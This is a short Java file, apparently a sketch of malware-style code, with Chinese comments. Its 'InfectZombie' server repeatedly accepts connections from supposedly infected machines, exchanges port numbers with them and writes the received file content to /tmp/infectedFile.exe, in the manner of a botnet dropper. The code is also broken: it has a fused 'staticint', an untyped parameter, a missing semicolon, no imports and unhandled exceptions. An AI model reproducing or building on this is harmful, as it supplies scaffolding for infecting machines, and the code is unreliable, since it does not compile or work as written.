public class InfectZombie {

    public static void main(String[] args) {

        //这里模拟有一台 infectedComputer，outputSocket可读取它的端口

        int outputSocket = 12345;

        while (true) {  //不断循环，不断接收新的电脑

            // 1. 接收客户端

            Socket clientSocket = getClient();

            // 2. 从客户端发送端口

            sendPortCommand(clientSocket, outputSocket);

            // 3. 从客户端接收新的端口，以及可执行文件

            int newOutputSocket = receivePortAndFile(clientSocket);

            // 如果新的端口存在，则更新outputSocket变量

            if (newOutputSocket > 0) {

                outputSocket = newOutputSocket;

            }

            // 关闭连接

            closeConnection(clientSocket);

        }

    }

    private static void sendPortCommand(Socket clientSocket, int outputSocket) {

        try {

            // 创建输出流

            OutputStream outputStream = clientSocket.getOutputStream();

            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));

            // 写入端口号

            writer.write(String.valueOf(outputSocket));

            writer.flush();

            writer.close();

        } catch (IOException e) {

            e.printStackTrace();

        }

    }

    private staticint receivePortAndFile(Socket clientSocket) {

        try {

            // 创建输入流

            InputStream inputStream = clientSocket.getInputStream();

            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            int newOutputSocket = 0;

            while (true) {

                String line = reader.readLine();

                // 如果读到空行，则表示接收完毕

                if (line == null || line.length() == 0) {

                    break;

                }

                // 先尝试将行解析为整型，如果可以，则假定是端口号

                try {

                    newOutputSocket = Integer.parseInt(line);

                    continue;

                } catch (NumberFormatException e) {

                    // 如果不能解析为整型，则假定此行是文件内容

                    // 将文件内容写入磁盘

                    write2Disk(line);

                }

            }

            reader.close();

            return newOutputSocket;

        } catch (IOException e) {

            e.printStackTrace();

            return 0;

        }

    }

    //将文件字符串写入到磁盘中

    private static void write2Disk(line) {

        try {

            File file = new File("/tmp/infectedFile.exe");

            FileWriter writer = new FileWriter(file);

            writer.write(line);

            writer.close();

        } catch (IOException e) {

            e.printStackTrace();

        }

    }

    private static void closeConnection(Socket socket) {

        try {

            socket.close();

        } catch (IOException e) {

            e.printStackTrace();

        }

    }

    private static Socket getClient() throws IOException {

        //这里模拟接收客户端，监听端口12345

        ServerSocket serverSocket = new ServerSocket(12345);

        Socket clientSocket = serverSocket.accept();

        serverSocket.close()

        return clientSocket;

    }

}
